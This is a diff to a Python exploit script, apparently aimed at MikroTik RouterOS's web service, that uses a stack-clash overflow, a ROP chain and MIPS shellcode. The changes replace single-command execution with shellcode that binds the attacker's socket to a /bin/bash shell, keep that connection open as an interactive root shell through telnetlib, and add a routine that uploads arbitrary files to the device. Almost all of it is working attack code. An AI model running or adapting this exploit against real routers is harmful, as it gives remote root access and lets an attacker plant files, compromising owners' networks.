@@ -10,7 +10,7 @@
 # ASLR enabled on libs only
 # DEP NOT enabled
 
-import socket, time, sys, struct, re
+import socket, time, sys, struct, re, telnetlib
 from ropper import RopperService
 
 AST_STACKSIZE = 0x800000 # default stack size per thread (8 MB)
@@ -88,56 +88,80 @@ def socketSend(s, data):
     print("Sent")
     time.sleep(0.5)
 
-def build_shellcode(shellCmd):
+def upload(tsock, ufiles, upaths):
+    fd = open(ufiles, 'rb')
+    ufile = ufiles.encode("ascii")
+    upath = upaths.encode("ascii")
+
+    print("Uploading " + ufiles + " in " + upaths + "...")
+
+    while True:
+        data = fd.read(1024)
+        if data:
+            hexdata = ''.join('\\\\x{:02x}'.format(c) for c in data).encode("ascii")
+            tsock.write(b"echo -e -n " + hexdata + b" >> " + upath + b"\n")
+        else:
+            break
+    print("Upload done!")
+    fd.close()
+
+def build_shellcode():
     shell_code = b''
-    shellCmd = bytes(shellCmd, "ascii")
+
     
-    # Here the shellcode will write the arguments for execve: ["/bin/bash", "-c", "shellCmd", NULL] and [NULL]
-    # XX XX XX XX  <-- here the shell code will write the address of string "/bin/bash"                           [shellcode_start_address -16]             <--- argv_array        
-    # XX XX XX XX  <-- here the shell code will write the address of string "-c"                                  [shellcode_start_address -12]
-    # XX XX XX XX  <-- here the shell code will write the address of string "shellCmd"                            [shellcode_start_address  -8]
-    # XX XX XX XX  <-- here the shell code will write 0x00000000 (used as end of argv_array and as envp_array)    [shellcode_start_address  -4]             <--- envp_array        
+    # Here the shellcode will write the arguments for execve: ["/bin/bash", NULL] and [NULL]
+    # XX XX XX XX  <-- here the shell code will write the address of string "/bin/bash"                           [shellcode_start_address -8]             <--- argv_array        
+    # XX XX XX XX  <-- here the shell code will write 0x00000000 (used as end of argv_array and as envp_array)    [shellcode_start_address -4]             <--- envp_array        
     
     # The shell code execution starts here!
-    shell_code += struct.pack('>L', 0x24500000)    # addiu s0, v0, 0           # s0 = v0                                                Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly]) 
-    shell_code += struct.pack('>L', 0x24020fa2)    # addiu v0, zero, 0xfa2     # v0 = 4002 (fork)                                       Put the syscall number of fork (4002) in v0
-    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start fork()
-    shell_code += struct.pack('>L', 0x10400003)    # beqz v0, 0x10             # jump 12 byte forward if v0 == 0                        Jump to execve part of the shellcode if PID is 0
+    shell_code += struct.pack('>L', 0x24500000)     # addiu s0, v0, 0           # s0 = v0                                               Save the shellcode_start_address in s0 (in v0 we have the address of the stack where the shellcode starts [<-- pointing to this location exactly]) 
+    
+    shell_code += struct.pack('>L', 0x24040002)     # addiu a0, zero, 0x2
+    shell_code += struct.pack('>L', 0x24020fc9)     # addiu v0, zero, 0xfc9     # dup syscall
+    shell_code += struct.pack('>L', 0x0000000c)     # syscall
+    shell_code += struct.pack('>L', 0x2044fffe)     # addi a0, v0, -1           # a0 = dup(2) - 1                                       Find the latest active socket
+    
+    shell_code += struct.pack('>L', 0x24050002)     # addiu a1, zero, 0x2
+    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 2)                                           Use the found socket as stderr
+    shell_code += struct.pack('>L', 0x0000000c)     # syscall
+    
+    shell_code += struct.pack('>L', 0x24050001)     # addiu a1, zero, 0x1
+    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 1)                                           Use the found socket as stdout
+    shell_code += struct.pack('>L', 0x0000000c)     # syscall
+    
+    shell_code += struct.pack('>L', 0x24050000)     # addiu a1, zero, 0x0
+    shell_code += struct.pack('>L', 0x24020fdf)     # addiu v0, zero, 0xfdf     # dup2(a0, 0)                                           Use the found socket as stdin
+    shell_code += struct.pack('>L', 0x0000000c)     # syscall
+
+    # if someone connects to webfig will cause problem to reused socket, to avoid this leave fork() commented
+    #shell_code += struct.pack('>L', 0x24020fa2)    # addiu v0, zero, 0xfa2     # v0 = 4002 (fork)                                       Put the syscall number of fork (4002) in v0
+    #shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start fork()
+    #shell_code += struct.pack('>L', 0x10400003)    # beqz v0, 0x10             # jump 12 byte forward if v0 == 0                        Jump to execve part of the shellcode if PID is 0
     
     # if v0 != 0 [res of fork()]
-    shell_code += struct.pack('>L', 0x24020001)    # addiu v0, zero, 1         # a0 = 1                                                 Put exit parameter in a0
-    shell_code += struct.pack('>L', 0x24020fa1)    # addiu v0, zero, 0xfa1     # v0 = 4001 (exit)                                       Put the syscall number of exit (4002) in v0
-    shell_code += struct.pack('>L', 0x0000000c)	   # syscall                   # launch syscall                                         Start exit(1)
+    #shell_code += struct.pack('>L', 0x24020001)    # addiu v0, zero, 1         # a0 = 1                                                 Put exit parameter in a0
+    #shell_code += struct.pack('>L', 0x24020fa1)    # addiu v0, zero, 0xfa1     # v0 = 4001 (exit)                                       Put the syscall number of exit (4002) in v0
+    #shell_code += struct.pack('>L', 0x0000000c)	# syscall                   # launch syscall                                         Start exit(1)
 
     # if v0 == 0 [res of fork()]
-    shell_code += struct.pack('>L', 0x26040050)    # addiu a0, s0, 0x50        # a0 = shellcode_start_address + 0x50                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
-    shell_code += struct.pack('>L', 0xae04fff0)    # sw a0, -16(s0)            # shellcode_start_address[-16] = bin_bash_address        Write in the first entry of the "argv" array the address of the string "/bin/bash" 
-    shell_code += struct.pack('>L', 0x26110060)    # addiu s1, s0, 0x60        # s1 = shellcode_start_address + 0x60                    Calculate the address of string "-c" and put it in s1 
-    shell_code += struct.pack('>L', 0xae11fff4)    # sw s1, -12(s0)            # shellcode_start_address[-12] = c_address               Write in the second entry of the "argv" array the address of the string "-c" 
-    shell_code += struct.pack('>L', 0x26110070)    # addiu s1, s0, 0x70        # s1 = shellcode_start_address + 0x70                    Calculate the address of string "shellCmd" and put it in s1  
-    shell_code += struct.pack('>L', 0xae11fff8)    # sw s1, -8(s0)             # shellcode_start_address[-8]  = shellCmd_address        Write in the third entry of the "argv" array the address of the string "shellCmd" 
+    shell_code += struct.pack('>L', 0x26040070)    # addiu a0, s0, 0x70        # a0 = shellcode_start_address + 0x50                    Calculate the address of string "/bin/bash" and put it in a0 (the first parameter of execve) 
+    shell_code += struct.pack('>L', 0xae04fff8)    # sw a0, -8(s0)             # shellcode_start_address[-8] = bin_bash_address         Write in the first entry of the "argv" array the address of the string "/bin/bash" 
     shell_code += struct.pack('>L', 0xae00fffc)    # sw zero, -4(s0)           # shellcode_start_address[-4]  = 0x00                    Write NULL address as end of argv_array and envp_array
-    shell_code += struct.pack('>L', 0x2205fff0)    # addi a1, s0, -16          # a1 = shellcode_start_address - 16                      Put the address of argv_array in a1 (the second parameter of execve)
+    shell_code += struct.pack('>L', 0x2205fff8)    # addi a1, s0, -8           # a1 = shellcode_start_address - 8                       Put the address of argv_array in a1 (the second parameter of execve)
     shell_code += struct.pack('>L', 0x2206fffc)    # addi a2, s0, -4           # a2 = shellcode_start_address - 4                       Put the address of envp_array in a2 (the third parameter of execve)
     shell_code += struct.pack('>L', 0x24020fab)    # addiu v0, zero, 0xfab     # v0 = 4011 (execve)                                     Put the syscall number of execve (4011) in v0   (https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/arch/mips/include/uapi/asm/unistd.h)
-    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve("/bin/bash", ["/bin/bash", "-c", "shellCmd", NULL], [NULL])
+    shell_code += struct.pack('>L', 0x0000000c)    # syscall                   # launch syscall                                         Start execve("/bin/bash", ["/bin/bash", NULL], [NULL])
 
-    shell_code += b'P' * (0x50 - len(shell_code))   # offset to simplify string address calculation  
+    shell_code += b'P' * (0x70 - len(shell_code))   # offset to simplify string address calculation  
     shell_code += b'/bin/bash\x00'                           # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x50]                 <--- bin_bash_address
-    
-    shell_code += b'P' * (0x60 - len(shell_code))   # offset to simplify string address calculation
-    shell_code += b'-c\x00'                                  # (Warning: do not exceed 16 bytes!)                 [shellcode_start + 0x60]                 <--- c_address
-    
-    shell_code += b'P' * (0x70 - len(shell_code))   # offset to simplify string address calculation
-    shell_code += shellCmd + b'\x00'                         #                                                    [shellcode_start + 0x70]                 <--- shellCmd_address
 
     return shell_code
 
-def build_payload(binRop, shellCmd):
+def build_payload(binRop):
     print("Building shellcode + ROP chain...")
 
     ropChain = b''
-    shell_code = build_shellcode(shellCmd)
+    shell_code = build_shellcode()
     
     # 1) Stack finder gadget (to make stack pivot) 
     stack_finder = binRop.get_gadgets("addiu ?a0, ?sp, 0x18; lw ?ra, 0x???(?sp% jr ?ra;")[0]
@@ -162,7 +186,7 @@ def build_payload(binRop, shellCmd):
 
     next_gadget_offset = MyRopper.get_ra_offset(stack_finder) - 0x18 - len(shell_code)
     if next_gadget_offset < 0: # check if shell command fits inside this big offset
-        raise Exception("Shell command too long! Max len: " + str(next_gadget_offset + len(shellCmd)) + " bytes")
+        raise Exception("Shell command too long! Max len: " + str(next_gadget_offset) + " bytes")
 
     ropChain += b'C' * next_gadget_offset # offset because of this: 0x600 + var_4($sp)
 
@@ -232,6 +256,8 @@ def stackClash(ip, port, payload):
 
     print("Done!")
 
+    return s1
+
 def crash(ip, port):
     print("Crash...")
     s = makeSocket(ip, port)
@@ -241,11 +267,11 @@ def crash(ip, port):
     time.sleep(2.5) # www takes up to 3 seconds to restart
 
 if __name__ == "__main__":
-    if len(sys.argv) == 5:
+    if len(sys.argv) in (4, 6):
         ip       = sys.argv[1]
         port     = int(sys.argv[2])
         binary   = sys.argv[3]
-        shellCmd = sys.argv[4]
+
 
         binRop = MyRopper(binary)
 
@@ -255,9 +281,23 @@ if __name__ == "__main__":
         if binRop.contains_string("pthread_attr_setstacksize"):
             AST_STACKSIZE = ROS_STACKSIZE
 
-        payload = build_payload(binRop, shellCmd)
+        payload = build_payload(binRop)
 
         crash(ip, port) # should make stack clash more reliable
-        stackClash(ip, port, payload)
+        shell_sock = stackClash(ip, port, payload)
+
+        # reuse socket
+        t = telnetlib.Telnet()
+        t.sock = shell_sock
+        time.sleep(1)
+
+        if len(sys.argv) == 6:
+            upload_file = sys.argv[4]
+            upload_path = sys.argv[5]
+            upload(t, upload_file, upload_path)
+        
+        t.write(b"echo '\nGot root ;-)\n'\r\n")
+        t.interact()
+
     else:
-        print("Usage: " + sys.argv[0] + " IP PORT binary shellcommand")
+        print("Usage: " + sys.argv[0] + " IP PORT binary [upload_file dest_path]")
